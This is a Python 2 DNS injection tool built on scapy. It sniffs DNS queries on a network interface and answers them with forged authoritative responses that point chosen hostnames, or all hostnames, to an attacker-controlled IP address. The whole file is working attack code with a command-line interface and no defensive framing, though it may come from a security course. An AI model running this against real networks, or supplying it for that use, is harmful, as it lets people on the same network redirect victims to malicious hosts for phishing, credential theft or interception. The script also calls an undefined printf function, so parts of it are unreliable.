#!/usr/bin/env python
from scapy.all import *
import sys
import netifaces
import getopt

hostname_list = []
ip_list = []

def get_attacker_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8',80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def dns_inject(packet):
    if packet and packet.haslayer(UDP) and packet.haslayer(DNS):
        dns = packet[DNS]
        udp = packet[UDP]
        if dns.qr == 1:
            return
        if int(udp.dport) == 53:
            if packet.haslayer(DNSQR):
                 redirect_IP = ""
                 packet_hostname = packet[DNSQR].qname
                 isSpoof = False
                 if len(hostname_list) > 0:
                      for num, hostname in enumerate(hostname_list):
                          if packet_hostname.rstrip('.') in hostname:
                               isSpoof = True
                               redirect_IP = ip_list[num]
                               break
                 else:
                      isSpoof = True
                      redirect_IP = get_attacker_ip()
         
                 if isSpoof:
                      spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                        DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
                       an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=redirect_IP))
                      send(spoofed_packet)
                      print spoofed_packet.summary()


if __name__ == '__main__':
    interface = None
    expression = None
    hostname_file = None
    try:
        options, args = getopt.getopt(sys.argv[1:], 'i:h::')
    except getopt.GetoptError:
        print "Invalid option"
        print "dnsinject [-i interface] [-h hostfilename] expression"
        sys.exit()

    for option, arg in options:
        if option == '-i':
            interface = arg
        elif option == '-h':
            hostname_file = arg

    if len(args) > 1:
        printf("Invalid number of non option arguments given")
        sys.exit()
    elif len(args) == 1:
        expression = args[0]

    if hostname_file != None:
        with open(hostname_file) as fp:
            for line in fp:
               ip_list.append(line.split()[0])
               hostname_list.append(line.split()[1])
    if interface == None:
        gws = netifaces.gateways()
        interface = str(gws['default'][netifaces.AF_INET][1])
    
    sniff(filter=expression, iface=interface, prn=dns_inject, store=0)
            
